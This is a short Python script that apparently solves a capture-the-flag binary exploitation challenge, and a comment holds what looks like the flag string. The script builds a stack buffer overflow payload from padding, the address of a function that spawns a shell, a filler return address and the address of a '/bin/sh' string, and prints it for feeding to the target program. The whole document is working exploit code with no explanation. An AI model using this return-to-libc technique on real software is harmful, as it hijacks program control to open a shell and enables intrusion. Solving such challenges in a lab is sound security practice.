import struct

# i_c4ll_wh4t_i_w4nt_n00b

def p(x):
    return struct.pack("<I", x)

SHELL = 0x080486bd
BIN_SH = 0x80487d0


payload = "A" * 27
payload += p(SHELL)
payload += p(0x41414141)
payload += p(BIN_SH)

print payload
